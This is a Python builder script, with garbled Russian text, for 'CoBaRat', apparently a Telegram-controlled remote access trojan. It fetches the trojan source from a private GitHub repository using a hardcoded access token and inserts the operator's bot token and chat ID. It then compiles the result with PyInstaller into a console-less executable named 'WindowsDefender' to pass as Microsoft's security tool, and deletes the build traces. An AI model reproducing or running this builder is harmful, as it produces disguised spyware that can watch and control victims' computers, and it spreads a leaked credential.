import os
import sys
import shutil
import tempfile
import requests
import base64
from pathlib import Path
import PyInstaller.__main__

def get_valid_path(prompt, default_path):
    """–ü–æ–ª—É—á–∞–µ–º –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É"""
    while True:
        path = input(prompt).strip()
        if not path:
            return default_path
        
        path = path.strip('"\'')
        path = path.replace('\u2800', ' ').replace('\xa0', ' ')
        
        if os.path.exists(path):
            return path
            
        print(f"–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω –ø–æ –ø—É—Ç–∏: {path}")
        print("–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ –∏–ª–∏ –æ—Å—Ç–∞–≤—å—Ç–µ –ø—É—Å—Ç—ã–º –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø—É—Ç–∏ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é")

def download_from_github(token, repo_owner, repo_name, file_path="CoBaRat.py"):
    """–°–∫–∞—á–∏–≤–∞–µ—Ç —Ñ–∞–π–ª –∏–∑ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è GitHub"""
    headers = {"Authorization": f"token {token}"}
    api_url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}"
    
    try:
        response = requests.get(api_url, headers=headers)
        response.raise_for_status()
        
        # –î–µ–∫–æ–¥–∏—Ä—É–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –∏–∑ base64
        content = base64.b64decode(response.json()["content"]).decode("utf-8")
        return content
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞: {e}")
        return None

def create_builder():
    # –ü–æ–ª—É—á–∞–µ–º –ø–∞–ø–∫—É, –≥–¥–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è build.py
    base_dir = Path(__file__).parent.absolute()
    print(f"–†–∞–±–æ—á–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è: {base_dir}")
    
    print("\n=== CoBaRat Builder ===")
    print("–≠—Ç–æ—Ç —Å–∫—Ä–∏–ø—Ç —Å–æ–∑–¥–∞—Å—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –¥–ª—è CoBaRat")
    
    # –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Ç–æ–∫–µ–Ω GitHub
    token = "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".strip()
    if not token:
        print("‚ùå –¢–æ–∫–µ–Ω –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!")
        return
    
    # –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è
    repo_owner = "DarkFimoz".strip()
    repo_name = "warning".strip()
    
    if not repo_owner or not repo_name:
        print("‚ùå –ù–µ —É–∫–∞–∑–∞–Ω—ã –¥–∞–Ω–Ω—ã–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è!")
        return
    
    # –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –±–æ—Ç–∞
    bot_token = input("–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω Telegram –±–æ—Ç–∞: ").strip()
    if not bot_token:
        print("‚ùå –¢–æ–∫–µ–Ω –±–æ—Ç–∞ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!")
        return
    
    chat_id = input("–í–≤–µ–¥–∏—Ç–µ –≤–∞—à Telegram ID (–º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å —É @userinfobot): ").strip()
    if not chat_id.isdigit():
        print("‚ùå ID –¥–æ–ª–∂–µ–Ω —Å–æ—Å—Ç–æ—è—Ç—å —Ç–æ–ª—å–∫–æ –∏–∑ —Ü–∏—Ñ—Ä")
        return
    
    try:
        # –°–∫–∞—á–∏–≤–∞–µ–º CoBaRat.py –∏–∑ GitHub
        print("\n‚è≥ –ó–∞–≥—Ä—É–∑–∫–∞ CoBaRat.py –∏–∑ GitHub...")
        cobarat_content = download_from_github(token, repo_owner, repo_name)
        
        if not cobarat_content:
            print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å CoBaRat.py. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ç–æ–∫–µ–Ω –∏ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π.")
            return
        
        # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
        temp_dir = base_dir / "build_temp"
        temp_dir.mkdir(exist_ok=True)
        print(f"\nüìÇ –í—Ä–µ–º–µ–Ω–Ω–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è —Å–æ–∑–¥–∞–Ω–∞: {temp_dir}")
        
        # –ó–∞–º–µ–Ω—è–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –≤ –∫–æ–¥–µ
        cobarat_content = cobarat_content.replace(
            "TOKEN = 'TOKEN'",
            f"TOKEN = '{bot_token}'"
        )
        cobarat_content = cobarat_content.replace(
            "ALLOWED_USERS = [ID]",
            f"ALLOWED_USERS = [{chat_id}]"
        )
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ñ–∞–π–ª
        modified_file = temp_dir / "WindowsDefender.py"
        modified_file.write_text(cobarat_content, encoding="utf-8")
        
        # –ù–∞—Å—Ç—Ä–æ–π–∫–∏ PyInstaller
        print("\n‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–±–æ—Ä–∫–∏:")
        dist_dir = base_dir / "dist"
        icon_path = base_dir / "ico.ico"
        
        pyinstaller_args = [
            str(modified_file),
            "--onefile",
            "--noconsole",
            "--strip",
            "--name=WindowsDefender",
            f"--distpath={dist_dir}",
            "--hidden-import=pydub",
            "--hidden-import=pyautogui",
            "--hidden-import=cv2",
            "--hidden-import=numpy",
            "--hidden-import=PIL",
            "--hidden-import=telegram",
            "--hidden-import=psutil",
        ]
        
        if icon_path.exists():
            pyinstaller_args.append(f"--icon={icon_path}")
            print(f"- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∏–∫–æ–Ω–∫–∞: {icon_path}")
        else:
            print("- –ò–∫–æ–Ω–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞, –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞—è")
        
        print("\nüî® –°–æ–±–∏—Ä–∞—é EXE —Ñ–∞–π–ª...")
        PyInstaller.__main__.run(pyinstaller_args)
        
        print(f"\n‚úÖ –ì–æ—Ç–æ–≤–æ! –ò—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –ø–∞–ø–∫–µ: {dist_dir}")
        
    except Exception as e:
        print(f"\n‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {str(e)}")
    finally:
        # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã
        if 'temp_dir' in locals() and temp_dir.exists():
            try:
                shutil.rmtree(temp_dir)
                print("\nüóëÔ∏è –í—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã —É–¥–∞–ª–µ–Ω—ã")
            except Exception as e:
                print(f"\n‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã: {str(e)}")
        
        # –£–¥–∞–ª—è–µ–º –¥—Ä—É–≥–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã PyInstaller
        for item in [base_dir / "build", base_dir / "WindowsDefender.spec"]:
            if item.exists():
                try:
                    if item.is_dir():
                        shutil.rmtree(item)
                    else:
                        item.unlink()
                    print(f"–£–¥–∞–ª–µ–Ω –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª: {item}")
                except Exception as e:
                    print(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å {item}: {str(e)}")

if __name__ == "__main__":
    print("=== CoBaRat Builder ===")
    print("–ü–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ:")
    print("1. –£ –≤–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –∫ –ø—Ä–∏–≤–∞—Ç–Ω–æ–º—É —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—é —Å CoBaRat.py")
    print("2. –í—ã —Å–æ–∑–¥–∞–ª–∏ GitHub Personal Access Token —Å –ø—Ä–∞–≤–∞–º–∏ 'repo'\n")
    
    create_builder()
    input("\n–ù–∞–∂–º–∏—Ç–µ Enter –¥–ª—è –≤—ã—Ö–æ–¥–∞...")